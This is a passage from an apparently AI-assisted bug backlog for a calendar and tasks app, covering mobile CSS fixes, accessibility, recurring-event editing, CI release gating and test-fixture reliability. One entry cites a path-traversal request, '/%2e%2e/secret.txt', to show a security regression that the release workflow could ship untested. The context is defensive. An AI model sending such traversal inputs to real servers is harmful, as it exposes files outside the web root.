  .agenda-ev { … border-left: 2px solid var(--ev-c, var(--accent)); … }

Containers it actually lands in (both 14px, not 18px):
app.css:35   .menu { … padding: 14px; … }
app.css:732  .settings-menu.set-sheet { … padding: 14px 14px calc(14px + env(safe-area-inset-bottom)); }
app.css:67   .set-panels { flex: 1 1 auto; min-width: 0; overflow-y: auto; padding-right: 2px; }  /* -> overflow-x: auto */
app.css:755  .set-sheet .set-body { display: block; flex: 1 1 auto; min-height: 0; overflow-y: auto; } /* -> overflow-x: auto */

Mount point — a settings panel, never a modal:
  SettingsMenu.tsx:235  <ArchivedCalendarsSection archived={archivedCals} … viewing={viewingCal} onViewing={setViewingCal} />
  ArchivedCalendarsSection.tsx:143  <div className="arch-events"> … <div className="agenda-ev" style={{'--ev-c': cssColor(cal.color)}}>

Failure scenario (iPhone 390x844): Settings -> Calendar -> tap an archived
calendar. The sheet's content box is 390 - 28 = 362px; `.arch-events` becomes
362 + 36 = 398px and starts at x = -18 relative to it, i.e. 4px OUTSIDE the
sheet's own border box. Result: (a) every agenda row's 2px --ev-c colour rule,
which sits at that -18px edge, is clipped away entirely, so the one visual cue
saying which calendar the preview belongs to never renders; (b) `.set-body`
gains 18px of horizontal scroll, so the settings sheet slides sideways under a
thumb; (c) the -18px bottom margin pulls the list under the sheet's padding.
```

</details>

**Suggested fix.** Make the bleed match the container it is in: `.arch-events { margin: 0 -14px -14px; }`
with `.arch-events .agenda-ev, .arch-day-head { padding-left: 14px; padding-right: 14px;
}` — or express it against the padding token instead of a literal so the two cannot
drift again. Either way add `overflow-x: hidden` (or `clip`) to `.set-panels`/`.set-
sheet .set-body` so no child can make settings scroll sideways.

**Pinned by** `2026-08-25 — the archived-calendar agenda on a phone > stays inside the sheet that actually contains it` in `frontend/src/backlog.aug25.stage4.browser.test.tsx` — the browser tier, because nothing that reads app.css as text can see an 18px overflow.

**Fixed**, and NOT with either shape the entry suggests. The hard `-18px` conflated two questions — how much of the CONTAINER's padding to cancel, and how far in the row's own content sits — so the fix separates them: `--arch-bleed` and `--arch-inset`, one pair per container, inherited down to `.arch-day-head` and `.agenda-ev` so the bleed and the inset cannot drift apart again. Which is exactly how they drifted: both were written for one parent, and then the section moved to another.

**In SETTINGS there is nothing to bleed.** `.set-panels` has no padding of its own, so `--arch-bleed: 0` is the whole answer and the rows take the 2px inset `.arch-row` uses directly above them in the same panel. Re-sizing the bleed to 14px — the entry's first suggestion — does NOT work, and was measured before this was chosen: it cancels the sheet's padding correctly and still overflows `.set-body`'s content box by 14px on the right, because a child that reaches the sheet's edge necessarily reaches past the box sitting inside that padding.

**`overflow-x: clip` on the container was deliberately NOT added**, though the entry asks for it "either way". Once the bleed is right there is nothing to clip, and it was measured not to help while the bleed was wrong — Chromium still reported the overflow through `scrollWidth`. A clip that swallows a future child's overflow is a worse thing to leave behind than the check that catches it.

The `.modal` case keeps 18px for both, which is what the original was written for and the only place it was ever right — and that is what the control asserts.

#### [x] The mobile-only hover rules on the sidebar bar leave the "View completed" toggle stuck in its active colour after a tap
`frontend/src/styles/app.css:809` · **low** · rendering · minor · stage 4

`.side-mobile-completed` and `.side-mobile-add` are declared INSIDE the @media (max-
width: 720px) block — they exist only on a phone — yet their `:hover` rule is not
wrapped in `@media (hover: hover)` and has no `:active` twin. tokens.css:196-210 states
this rule explicitly and applies it to `.btn`/`.icon-btn`; app.css repeats the reasoning
at 634 and 1840. On a touchscreen `:hover` latches on tap and persists until something
else is tapped, and here the hover colour is byte-identical to the toggle's only active-
state marker, so the control reports the wrong pane.

<details><summary>Evidence</summary>

```
app.css:804-809 (all inside @media (max-width: 720px))
  .side-mobile-completed, .side-mobile-add {
    flex: none; background: none; border: 0; border-left: 1px solid var(--rule);
    color: var(--fg-muted); cursor: pointer; padding: 0 16px; font-size: calc(18px * var(--fs-scale)); line-height: 1;
  }
  .side-mobile-completed.active { color: var(--accent); }
  .side-mobile-add:hover, .side-mobile-completed:hover { color: var(--accent); }

Sidebar.tsx:388
  <button className={`side-mobile-completed ${completedActive ? 'active' : ''}`}
    title={completedActive ? 'Back to tasks' : 'View completed'}
    aria-pressed={completedActive} onClick={onToggleCompleted}>✓</button>

Failure scenario (iPhone, Tasks tab, 390px):
  Tap ✓ -> completedActive true, glyph turns --accent (correct). Tap ✓ again to
  return -> completedActive false, `.active` is removed, but `:hover` is still
  latched from the tap and paints the identical --accent. The glyph is the
  button's ONLY visible state (aria-pressed is not visual), so the bar says you
  are still in the completed pane while the list behind it shows open tasks.
  The colour only clears when some other element is tapped.
  Same latch on the `+` button beside it, where it advertises a New-collection
  form that is not open.
  (43 unguarded `:hover` rules exist in app.css against 8 `@media (hover: …)`
  blocks; these two are the ones that live inside the phone-only block and whose
  hover colour collides with a state colour.)
```

</details>

**Suggested fix.** Move the rule under a guard and add the touch equivalent, matching tokens.css:203-210:
`@media (hover: hover) { .side-mobile-add:hover, .side-mobile-completed:hover { color:
var(--accent); } }` plus `.side-mobile-add:active, .side-mobile-completed:active {
color: var(--accent); }`. Worth sweeping the other 41 unguarded `:hover` rules at the
same time — `.side-item:hover { background: var(--bg-elev) }` (line 114) collides with
`.side-item.active`'s identical background inside the mobile drawer for the same reason.

**Pinned by** `2026-08-25 — the phone-only hover rules > are all guarded by a hover-capability query` in `frontend/src/backlog.aug25.stage4.browser.test.tsx`, swept over the CSSOM rather than over the two selectors named here.

**Fixed** with the suggested fix: the two rules move under `@media (hover: hover)` and gain `:active` equivalents, which is the shape `tokens.css` uses for every other button state. `.side-item:hover` is fixed too — the entry names it specifically, and its background is IDENTICAL to `.side-item.active`'s, so inside the mobile drawer a tapped row stayed lit and read as the selected list.

**The other 41 unguarded `:hover` rules were left alone, deliberately.** None has been shown to misreport a STATE, which is what makes these three different: a latched hover that merely looks warm is cosmetic; a latched hover indistinguishable from "selected" or "on" is a lie about the data. Sweeping the rest would be a large diff across rules no finding has exercised, on a surface where a mistake is only visible by looking.

#### [x] Removing the last Home module puts the five stock modules back on the board
`frontend/src/components/HomeView.tsx:52` · **low** · rendering · stage 4

`committed` treats an empty saved layout as "never arranged" and substitutes
DEFAULT_LAYOUT. `removeModule` on the final module produces `[]`, `commit` passes that
to `onLayoutChange`, App persists `dashboard: []`, and the component immediately re-
renders with all five default modules — Today, Upcoming, Mini calendar, Overdue,
Recently completed. Pressing "Remove" therefore ADDS five modules, including a mini
calendar that starts fetching a six-week window of events the user just removed. It also
makes an empty (or nearly-empty) dashboard unrepresentable, and it is not reversible
from the UI: the state survives a reload because `[]` is what was stored.

<details><summary>Evidence</summary>

```
const committed = layout.length ? layout : DEFAULT_LAYOUT
…
onClick={() => commit(removeModule(committed, m.id))}
const commit = (next) => { setPreview(null); onLayoutChange(sanitizeLayout(next)) }

Reproduced (vitest, jsdom): render HomeView with layout=[{id:'a',kind:'quick_add',x:0,y:0,w:4,h:3}], click Arrange, click "Remove Quick add" -> onLayoutChange called with []; re-render with layout=[] ->
`.dash-mod .label` = ["Today","Upcoming","Mini calendar","Overdue","Recently completed"].

Scenario: a user who wants only "Quick add" and "Today" enters Arrange and clears the board to start fresh. On the last removal the full stock arrangement reappears, and because five of the eight kinds are now placed, "Add module" offers only the remaining three.
```

</details>

**Suggested fix.** Either disable the remove button when `mods.length === 1` (with a title explaining the
board cannot be empty), or stop overloading `[]`: keep a separate "never arranged"
signal (e.g. `layout === null` from App when the settings key is absent) so a
deliberately empty board is representable and Remove never adds modules.

**Pinned by** `2026-08-25 — clearing the dashboard > does not put five modules back when the last one is removed` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the entry's SECOND option, chosen over disabling the button: `[]` is no longer overloaded. `App` holds `dashboard` as `DashboardModule[] | null`, initialised to `null` and set only when the settings key is actually present, and `HomeView` reads `layout ?? DEFAULT_LAYOUT`. So "never arranged" and "deliberately empty" are two values, and Remove is never a control that ADDS five modules. Disabling Remove at the last module would have closed the finding by making a product decision — the board can never be empty — out of a workaround.

**The pin cannot see the other half**, because it starts from a board that already has modules on it: collapsing the two values the OTHER way (null read as empty) closes the pin by handing every new account a blank page. That has its own test, as does the boundary itself — an emptied board stays empty.

**Two deliberate test edits, and they are the fix in miniature.** `HomeView.test.tsx`'s "falls back to the stock arrangement when nothing is saved" and "does not persist the stock arrangement until something is changed" both passed `[]` to mean "nothing is saved" — which is precisely the conflation this finding is about, written into the tests that were supposed to hold the behaviour. They pass `null` now; both assertions are unchanged.

#### [x] The whole month grid is keyboard-inoperable: day cells and event chips are unfocusable divs, so no event can be opened or created without a pointer
`frontend/src/components/CalendarView.tsx:623` · **low** · rendering · stage 4

Every interactive surface in the month grid is a plain `<div onClick>` with no `role`,
no `tabIndex` and no `onKeyDown`: the day cell (which is the only way to create an event
on that day) at line 571, the event chip (the only way to open an event) at line 623,
and the task chip at line 672. Tabbing from the header's 'Today' button skips the entire
grid. The same component gets this right elsewhere — `+N more` is a real `<button>`, the
mobile agenda rows are `<button>`s, and the sidebar's task-list rows carry
`role="checkbox" tabIndex={0}` with a Space/Enter handler — so the omission is
inconsistent within one file. TasksView has the same shape for its primary open
affordances (`.task-body` at TasksView.tsx:853 and `.day-card-body` at :795).

<details><summary>Evidence</summary>

```
Measured against the real component (vitest, jsdom), a March 2026 grid holding one event:
  focusable nodes inside .cal-grid: 0
  chip tag/role/tabindex: DIV null null
  cell tag/role/tabindex: DIV null null
The query used was `a[href], button, input, select, textarea, [tabindex]:not([tabindex="-1"])`.

Failure scenario: a keyboard or screen-reader user on the Calendar tab presses Tab from the month header. Focus goes ‹ / Today / › / New event and then straight out of the grid into the next pane — there is no key sequence that opens 'Standup' or creates an event on the 12th. A screen reader also announces the chips as static text, with the recurrence marker and the clock read as part of the label.

Contrast CalendarView.tsx:134-139 (`role="checkbox" tabIndex={0}` + Space/Enter) and :684 (`<button className="cal-more">`) in the same file.
```

</details>

**Suggested fix.** Give the chips `role="button" tabIndex={0}` with an `onKeyDown` for Enter/Space that
calls the same handler as `onClick` (the sidebar row above is the in-file precedent),
and either make the day cell a real button or add `role="gridcell" tabIndex` with a
roving-tabindex arrow-key walk over the 42 cells. Add a test asserting `.cal-grid`
exposes at least one focusable node per rendered chip.

**Pinned by** `2026-08-25 — reaching the month grid from a keyboard > exposes the event chip and the day cell as operable controls` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix's SECOND option for the cells, chosen deliberately: `role="grid"` with a roving tabindex over the 42 cells, arrows walking it, Home/End for the week, PageUp/PageDown for the month, and Enter/Space opening a draft on the focused day. Forty-two real buttons — the first option — would be reachable and unusable: crossing a month to get to whatever follows the grid is not an improvement on not reaching it at all.

The chips take the first option: `role="button"`, `tabIndex={0}` and an Enter/Space handler, the trio the sidebar row in this same file already uses. **The TASK chip got it too**, though the entry names only the event chip — a task chip in the same cell left unreachable is the same bug with a different selector.

**The tab stop is a DAY, not an index.** Each month's grid starts on a different weekday, so index 8 is a different date every month and an index-based stop would wander as the reader pages; worse, a `keyDay` no longer on screen leaves the grid with NO tab stop, i.e. out of the tab order entirely. An effect re-homes it onto the same day-of-month in the new grid, and a mutation removing that leaves zero tab stops after a page.

**One deliberate test edit, and it corrects the pin against its own docstring.** The pin says "a roving tabindex over the 42 cells (the suggested fix for the grid) passes too, since at least one cell carries `tabindex="0"` at any time" — but it asserted on `grid.querySelector('.cal-cell')`, the FIRST cell, which under a roving tabindex is a leading blank from the previous month at `-1`. As written it rejected the repair it names. It now takes the cell that actually holds the tab stop, falling back to the first so a grid of real `<button>`s still passes exactly as before.

**The pin asks only that something is focusable**, which a roving tabindex is only worth having if the arrows move it — and it cannot see that. Six tests cover the walk: one tab stop for the month, each of the four arrows moving it by the right step WITH focus following, Enter opening the right day's draft, a tab stop surviving a page, and the arrows staying the cell's when a chip handles the key.

#### [x] Changing a repeating event's cadence and then picking "This event" silently discards the change and reports success
`frontend/src/components/CalendarView.tsx:917` · **low** · bug · stage 3

`commit()` folds `repeatFields()` into the body only on the `recurring && scope ===
'all'` branch and on the non-recurring branch. For `scope === 'this'` and `scope ===
'thisandfuture'` the repeat select's value never reaches the wire, so a user who
deliberately changes Repeat from 'Keep current schedule' to 'Weekly' (or to 'Does not
repeat') and then answers the scope prompt with either of the two per-occurrence options
gets no rule change, no error and no warning — the modal closes and the grid repaints as
if it worked. The scope prompt itself gives no hint that two of its three buttons cannot
carry the edit the user just made.

<details><summary>Evidence</summary>

```
CalendarView.tsx:909-920
```ts
if (recurring && scope === 'all') {
  const shift = timeChanged ? { ...times, recurrence_id: e.recurrence_id } : {}
  onSave({ ...details, ...shift, ...repeatFields(), scope: 'all' }, calPick, e.uid)
} else if (recurring) {
  onSave({ ...details, ...times, recurrence_id: e.recurrence_id, scope }, calPick, e.uid)
}
```
Reproduced against the real component (vitest, jsdom) on a recurring occurrence, selecting Repeat=weekly and then the scope button:
  scope=this body: {"summary":"Standup","location":"","description":"","tags":[],"start":"2026-03-09T09:00","end":"2026-03-09T09:30","recurrence_id":"2026-03-09T09:00:00","scope":"this"}   <- no `repeat`
  scope=all  body: {"summary":"Standup",...,"repeat":"weekly","scope":"all"}
The same holds for 'This & following'.
```

</details>

**Suggested fix.** Either carry `repeatFields()` on the `thisandfuture` branch (the backend's split-series
path can legitimately re-rule the tail) and disable/hide the Repeat select once the user
is about to pick 'This event', or — minimally — when `repeat !== 'keep'` on a recurring
event, grey out the two per-occurrence buttons in the scope chooser with a one-line note
that a schedule change applies to the series. Add a test asserting a cadence change is
either sent or refused, never silently dropped.

**Pinned by** `2026-08-25 — the event editor > never drops a cadence change on the floor` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** by giving the two per-occurrence scopes the two different answers they actually have, neither of which is "close as if it worked".

**"This & following" CARRIES the change**, because the backend really re-rules the tail. That was verified against `ical.split_series` directly before relying on it, as the stage plan required: a tail asked for weekly comes back `RRULE:FREQ=WEEKLY`, a tail asked for "does not repeat" comes back with no RRULE, and the head keeps its own bounded rule. `commit` folds `repeatFields()` into the `thisandfuture` branch.

**"This event" REFUSES it.** That scope writes a RECURRENCE-ID override for one occurrence, and an RRULE on an override means nothing — so `pickScope` sends the user back to the form with the change still in it and an inline `role="alert"` saying which scopes can carry it, and the scope prompt itself warns before they choose. Disabling the button instead was the first design and does not work here: the prompt REPLACES the form (a ternary), so a disabled button leaves the user staring at a prompt with no way to see or amend the change, and the pin's own refusal branch — dialog still open, Repeat still reading "weekly" — cannot be satisfied.

**The pin cannot see either half on its own**, so both got tests. It clicks one button and takes "sent or refused", so refusing ALL THREE scopes passes it — and that would leave re-scheduling a series from a point in time impossible except by re-scheduling the whole thing. `carries a cadence change on "This & following"` and `still saves one occurrence when the repeat was not touched` close that off; the second is the control against refusing "This event" for every repeating edit rather than only for a cadence change.

#### [x] Shutdown step 2 reports "Everything on today is done" after the owner MOVED everything to tomorrow
`frontend/src/components/ShutdownRitual.tsx:232` · **low** · rendering · minor · stage 4

`unfinished` is derived from `entries`, and `TodayView.entries` filters out rows
carrying `rolled_to` as well as `dropped_at` — by design, so a decided row leaves the
day's total. The consequence is that the "Move all N to tomorrow" sweep, or dropping the
last leftover, empties `unfinished` and the step falls through to an empty state that
states the opposite of what happened: nothing was done, everything was postponed. On the
one screen whose whole job is an honest record of the day, that is a lie the owner has
just personally disproved.

<details><summary>Evidence</summary>

```
ShutdownRitual.tsx:82 `const unfinished = entries.filter((e) => !isDone(e))`; :229-234
```
if (!unfinished.length) {
  return (
    <div className="plan-body">
      <p className="empty">Everything on today is done. Nothing to carry.</p>
```
TodayView.tsx:699 `entries = allEntries?.filter((e) => !e.dropped_at && !e.rolled_to)`.

Reproduced in the repo's harness: day holds two undone rows Alpha and Bravo; open Shut down → Next → click "Move all 2 to tomorrow"; `rollDayEntry` called twice, then `document.querySelector('.plan-body').textContent` === "Everything on today is done. Nothing to carry."
```

</details>

**Suggested fix.** Distinguish the two exits — keep a count of rows decided about during this session (or
compare `entries.filter(isDone).length` against `entries.length`) and render "Everything
on today is decided." / "Nothing left to decide about." when the list was emptied by
rolls and drops rather than by ticks.

**Pinned by** `2026-08-25 — the shutdown ritual, step two > does not call a day that was postponed a day that was finished` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix's FIRST form — a count of rows decided about during the ritual — rather than the `entries.filter(isDone).length` comparison it offers as an alternative. The comparison cannot separate the mixed case: one row ticked and one rolled away leaves an `entries` array whose every member is done, and the honest sentence there is still not "everything is done". A decision counter answers all three cases with one number.

**Held in `ShutdownRitual`, not in `FollowsStep`**, and that placement is the fix's other half. The step unmounts when the owner presses Next, so a counter inside it resets on Back and tells the same lie again — with the rows now gone from the list, which is when the sentence is most convincing. It has its own test.

Two sentences, because "done" is the one thing this step exists to be able to say and it has to stay true. A mutation that always says "decided" closes the pin and loses it, which is what the control catches; one that counts drops but not rolls closes nothing.

#### [x] On a phone every Today row sits 12px right of its own heading, add box and empty state
`frontend/src/styles/app.css:845` · **low** · rendering · minor

The `max-width: 720px` block pulls the page's horizontal padding in to 14px for `.task,
.quickadd, .content-head, .cal-head, .empty, .banner` and `.section-label`, but nothing
in that block touches the Today tab's own rules, which all keep `var(--gutter)` (26px
default, 24px in the workspace presets). So on every phone the Today tab renders as a
staircase: header/add box/section labels/`.empty` at 14px, and `.today-row`, `.today-
quiet`, `.today-more`, `.today-load`, `.today-agenda .agenda-ev` and `.today-reflection-
text` at 26px. The two empty states even disagree with each other — "Nothing on today
yet…" is a bare `.empty` (14px) while the habits hint and "Nothing on the calendar
today." carry `.today-quiet`, whose later `padding` shorthand wins over the media rule
(26px). The tab's own comments treat one left edge as an invariant (`--today-mark-w`,
`.today-check-gap`, and `.today-more`'s "takes the page gutter so it lines up under the
titles"), which is exactly what breaks here.

<details><summary>Evidence</summary>

```
app.css:845 `.task, .quickadd, .content-head, .cal-head, .empty, .banner { padding-left: 14px; padding-right: 14px; }` and :846 `.section-label { padding: 14px 14px 4px; }` — inside `@media (max-width: 720px)` (:696-892). `sed -n '696,892p' styles/app.css | grep today` matches only a comment. Meanwhile app.css:1536 `.today-row { … padding: var(--row-y) var(--gutter); }`, :1633 `.today-more { padding: 6px var(--gutter); }`, :1680 `.today-agenda .agenda-ev { padding: 8px var(--gutter); }`, :1685 `.today-quiet { padding: 8px var(--gutter); … }` (declared after the media block at equal specificity, so it wins), :1502 `.today-load`, :1492 `.today-reflection-text`. tokens.css:46 `--gutter: 26px`. At 390px: "Habits" label left edge 14px, the habit rows' checkboxes 26px.
```

</details>

**Suggested fix.** Either add `--gutter: 14px` to the `max-width: 720px` block (it is the density lever the
tokens file describes) or extend the existing 14px rule to `.today-row, .today-quiet,
.today-more, .today-load, .today-agenda .agenda-ev, .today-reflection-text`.

**Fixed** by the first option — and the hand-maintained list it replaced is gone rather
than kept beside it, because keeping both is the stair-step pointing the other way: a
user who sets a 40px gutter in the Appearance editor writes it as an inline property on
`<html>`, which beats every stylesheet rule, so `.today-row` would honour their 40px
while a literal `.task { padding-left: 14px }` forced 14px on the row above it.

The declaration is `:root, :root[data-preset]`, not a bare `:root`. A preset declares its
own gutter as `:root[data-preset="workspace"]` — (0,2,0) against (0,1,0) — so the bare
form loses to it and every preset user keeps the desktop gutter, which is this finding
again for them. One of this sweep's verifiers caught that while confirming the capped
twin of this finding; the shipped rule reaches the presets because of it.

Measured in Chromium at 390x844, shipped default and `data-preset="workspace"`:
`.content-head`, `.quickadd`, `.section-label`, `.today-row`, `.empty`, `.today-quiet`
and `.today-more` all resolve a 14px left edge. The two empty states agree now.

#### [x] The Today row's ✕, estimate and + are ~16–19px tap targets on the phone-primary surface
`frontend/src/styles/app.css:1587` · **low** · rendering · minor · stage 4

`.today-drop` (the only way to take a row off the day), `.today-plus` (the only way to
accept a suggestion) and `.today-est` are bare glyph buttons at 11–12px with 2px/4px
padding and `line-height: 1`, giving roughly 16×16 to 19×23 CSS px. That is well under
the ~44px touch guideline and about half of the app's own `.btn`/`.icon-btn` norm
(~31px). The block directly above already reasons about touch for this control — `@media
(hover: none) { .today-drop { opacity: 1 } }` exists precisely because a hover-revealed
✕ is unreachable on a phone — but only its visibility was fixed, not its size, and there
is no swipe or long-press alternative anywhere on this screen.

<details><summary>Evidence</summary>

```
app.css:1587-1601
```
.today-drop, .today-plus {
  background: none; border: 0; cursor: pointer; flex: none; line-height: 1;
  font-family: var(--mono); font-size: calc(12px * var(--fs-scale));
  color: var(--fg-faint); padding: 2px 4px;
}
...
.today-plus { color: var(--accent); font-size: calc(15px * var(--fs-scale)); }
@media (hover: none) { .today-drop { opacity: 1 } }
```
and app.css:1556-1564 `.today-est { … padding: 2px 4px; font-size: calc(11px * var(--fs-scale)); min-width: 42px; }`. Nothing in the `max-width: 720px` block enlarges them (`sed -n '696,892p' styles/app.css | grep today` → comment only), unlike `.side.drawer .side-item .side-edit { padding: 6px 8px; font-size: 17px }` which the same block does enlarge for the drawer. At 390×844 with `--fs-scale: 1`, `.today-drop`'s box is ~16px tall inside a ~37px row: aiming at it from a thumb lands on inert row area.
```

</details>

**Suggested fix.** Inside the existing `@media (max-width: 720px)` block (or under `@media (hover: none)`),
give these three a touch box: e.g. `.today-drop, .today-plus, .today-est { min-height:
40px; min-width: 40px; padding: 10px 8px; display: inline-flex; align-items: center;
justify-content: center; }` — the glyph size can stay as it is.

**Pinned by** `2026-08-25 — the Today row on a phone > gives every control a 44px tap box` in `frontend/src/backlog.aug25.stage4.browser.test.tsx`, swept over `.today-row button` and asserting the 44px accessibility guideline rather than this entry's 40px.

**Fixed** at the pin's 44px rather than this entry's 40px, and SWEPT over `.today-row button` rather than the three selectors named here. The recurring failure in this stylesheet is a guard only as wide as the set it enumerates — the sibling finding was itself a rule that named three classes and reached none of them — so the tick (`.check`, which this entry does not mention, and the worst of them at 21×21) is covered, and so is a button added to this row later. A mutation naming only the three passes everything except the tick.

`min-height`/`min-width` with a flex centre, so the tap BOX grows and no glyph does — which is what the control asserts and what a naive `font-size` bump would break.

**Accepted cost, decided rather than discovered**: a Today row goes from ~53px to ~62px, so roughly 13 rows fit an 844px phone instead of 16. Recorded in STAGES.md.

#### [x] A line pinned to "task" that the parser read nothing in writes its untrimmed text as the VTODO SUMMARY
`frontend/src/components/TodayView.tsx:1240` · **low** · bug · minor · stage 3

`parseEntry` returns `summary: text` byte for byte when it recognises nothing (its
documented "'' in, '' out" rule), so on the pinned-task path `create(list, { summary:
p.summary })` sends the raw input including leading and trailing whitespace. The note
path right beside it sends `raw = text.trim()`, and the parsed-task path sends
`without()`'s trimmed remnant, so this one branch is the odd one out. A leading space is
invisible in the chip preview but is real in the VTODO the whole account then sees:
`sortTasks` orders by summary, so the task sorts ahead of everything, and it goes out
over CalDAV to Tasks.org/Thunderbird that way. A trailing space is the common case on a
phone, where the space bar is pressed before Enter or autocorrect appends one.

<details><summary>Evidence</summary>

```
TodayView.tsx:1236-1244
```
const t = await create(list, {
  summary: p.summary,
  ...(dated ? { due: dueFromParse(p, on) } : {}),
})
```
daytext.ts:461 `const verbatim: ParsedEntry = { summary: text, dueDate: '', dueTime: '', guessed: false }`; TodayView.tsx:1229-1232 the note arm uses `raw` (`text.trim()`). Backend `CreateTask.summary` is `XmlSafeText` (app.py:161) with no strip and no min_length, so nothing downstream trims it.

Measured: `parseEntry('  buy milk  ', now)` → `{"summary":"  buy milk  ","dueDate":"","dueTime":"","guessed":false}`. Type `  buy milk  ` into the add box, press "Make it a task", press Enter → POST /api/lists/l1/tasks with `summary: "  buy milk  "`.
```

</details>

**Suggested fix.** Trim at the one call site: `const t = await create(list, { summary: p.summary.trim() ||
raw, ... })`, or have `parseEntry` return the trimmed input as `summary` in the verbatim
arm (its own `without()` already trims on every other arm).

**Pinned by** `2026-08-25 — the Today add box > trims the summary of a line the parser read nothing in` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** with the suggested fix's FIRST form, deliberately: `summary: p.summary.trim() || raw` at the one call site in `addParsedTask`. NOT in `parseEntry` — its verbatim arm returning its input byte for byte is the parser's documented contract ("'' in, '' out"), and `daytext.test.ts`'s "the empty line" pins it. The note path beside this one already sends `text.trim()` and the parsed path sends `without()`'s trimmed remnant, so this makes the third branch agree with the other two rather than changing what any of them mean.

### Desktop, CI/deploy, test suite

#### [x] desktop-release.yml publishes Smylte.exe without ever running the C# test suite
`.github/workflows/desktop-release.yml:82` · **medium** · test-gap · minor

The `client` job builds and uploads the Windows client with `dotnet publish` only. It
never runs `desktop/Smylte.Desktop.Tests`, which is the suite that covers the two places
in the client where a mistake is a security bug (LocalServer's path-traversal guard and
the cookie rewriter) plus the updater's directory-swap recovery. `release: needs: [web,
client]`, so nothing else gates it either, and desktop-release.yml has no dependency on
ci.yml — the two workflows run in parallel on the same push, so a red `desktop` job in
ci.yml does not stop the release. The asymmetry is clearly unintended: the workflow
header says the `web` job repeats ci.yml's frontend gates on purpose because "a release
that skipped the tests would be a release nobody could trust", and `web` does run `npm
run typecheck` and `npm test`. `client` does neither. The stage-5 backlog meta-test
(backend/tests/test_backlog_stage5.py:71) only asserts `dotnet test` appears in ci.yml,
so nothing guards the release path at all.

<details><summary>Evidence</summary>

```
desktop-release.yml:70-92 —
  client:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      - name: Publish
        run: >
          dotnet publish desktop/Smylte.Desktop/Smylte.Desktop.csproj
          -c Release
          -o publish
      - uses: actions/upload-artifact@v4
        with:
          name: client
          path: publish/Smylte.exe

ci.yml:93-99 is where the tests actually run, in a different workflow:
      - name: Client unit tests
        run: dotnet test desktop/Smylte.Desktop.Tests/Smylte.Desktop.Tests.csproj

Failure scenario: a commit regresses `LocalServer.Resolve` so that `/%2e%2e/secret.txt` resolves outside the web root (exactly the case pinned at desktop/Smylte.Desktop.Tests/LocalServerTests.cs:44-51). It is pushed to main. ci.yml's `desktop` job goes red. desktop-release.yml runs concurrently, `client` compiles cleanly because the regression is behavioural not syntactic, `release` uploads the new Smylte.exe onto `desktop-latest` with `--clobber`, and every installed desktop client picks it up on next launch. A `workflow_dispatch` run is worse still: it can publish from any ref, where the C# tests may never have run at all.
```

</details>

**Suggested fix.** Add `- run: dotnet test desktop/Smylte.Desktop.Tests/Smylte.Desktop.Tests.csproj` to the
`client` job before the Publish step (release already `needs: client`, so that is
sufficient to gate the publish). Extend the meta-test in
backend/tests/test_backlog_stage5.py::test_the_windows_client_has_tests_and_ci_runs_them
to require `dotnet test` in desktop-release.yml as well as ci.yml, so this cannot
silently regress again.

#### [x] CI's "full backend suite against a real scratch Radicale" gate is unenforced — a healthy-but-unauthenticated container turns ~230 tests into skips and the job still passes
`backend/tests/conftest.py:36` · **medium** · test-gap

ci.yml's header states the autopull gate as "main only ever receives commits that passed
the full backend suite (against a real scratch Radicale)". Nothing enforces that the
Radicale-backed half of the suite actually ran. `_scratch_up` converts any failure of
`DavClient.options()` into `pytest.skip`, and `options()` requests the principal path
with `expected={200, 204}` — so an HTTP 401 from a broken htpasswd file or `[auth]`
config is a skip, not a failure. The docker healthcheck cannot catch that either: it
fetches `http://127.0.0.1:5232/` with no credentials, and Radicale 3.7.4 dispatches
anonymous requests (`radicale/app/__init__.py`: `if not login or user:`), with `do_GET`
302-redirecting `/` to `.web`, so the healthcheck returns a success status regardless of
whether any account is usable. `docker compose --wait` is therefore satisfied by a
container whose auth is completely broken. Secondary defect in the same healthcheck:
`401` is listed in the accepted-status tuple but `urllib.request.urlopen` *raises*
`HTTPError` on 401 rather than returning a response, so `.status in (...)` can never see
it — that branch is dead.

<details><summary>Evidence</summary>

```
backend/tests/conftest.py:29-36 —
@pytest.fixture(scope="session")
def _scratch_up():
    try:
        c = _make_dav()
        c.options()
        c.close()
    except Exception as e:  # noqa: BLE001
        pytest.skip(f"scratch Radicale unreachable on {SCRATCH_URL}: {e}")

backend/tasksd/dav/client.py:128-130 —
    def options(self) -> set[str]:
        resp = self._request("OPTIONS", self.principal_path, expected={200, 204})

scratch/docker-compose.yml:26 —
      test: ["CMD", "python", "-c", "import urllib.request,sys; sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:5232/', timeout=3).status in (200,301,302,401,207) else 1)"]

Verified locally: `.venv/bin/python -m pytest -q` with no scratch server reports ~230 of 663 tests skipped and EXIT=0.

Failure scenario: a PR flips `htpasswd_encryption = plain` to `bcrypt` in scratch/radicale/config (or renames scratch/radicale/users so docker creates a directory at the bind-mount target). The container starts, the anonymous `/` healthcheck 302s, `docker compose ... --wait` succeeds, `_scratch_up` gets a 401 from OPTIONS /testuser/ and skips the session fixture, so every DAV round-trip, sync, concurrency and MCP test in the suite is skipped. `python -m pytest` exits 0, all five CI jobs go green, and ~/tasks-autopull.sh deploys the commit within a minute — with the entire integration suite having asserted nothing.
```

</details>

**Suggested fix.** Make the skip conditional on an explicit opt-out: in `_scratch_up`, if an env var such
as `SCRATCH_REQUIRED=1` (set in ci.yml's `Run tests` step alongside `SCRATCH_STORAGE`)
is present, `pytest.fail` instead of `pytest.skip`, so local runs stay convenient while
CI cannot pass with the integration half skipped. Separately, give the healthcheck
credentials (fetch `/testuser/` with a Basic header) so a broken htpasswd file makes the
container unhealthy, and drop the unreachable `401` from the accepted-status tuple.

#### [x] Re-running deploy/setup.sh installs a new tasks.service but never restarts the service, so unit changes silently do not take effect
`deploy/setup.sh:99` · **medium** · bug · minor

setup.sh is explicitly designed to be re-run (line 20 short-circuits on an existing env
file and says "delete it to regenerate"), and DEPLOY.md §A names `sudo
~/tasks/deploy/setup.sh` as the way to install the app. On every run it reinstalls
/etc/systemd/system/tasks.service and calls `systemctl daemon-reload` followed by
`systemctl enable --now tasks.service`. `--now` maps to `start`, and `start` on an
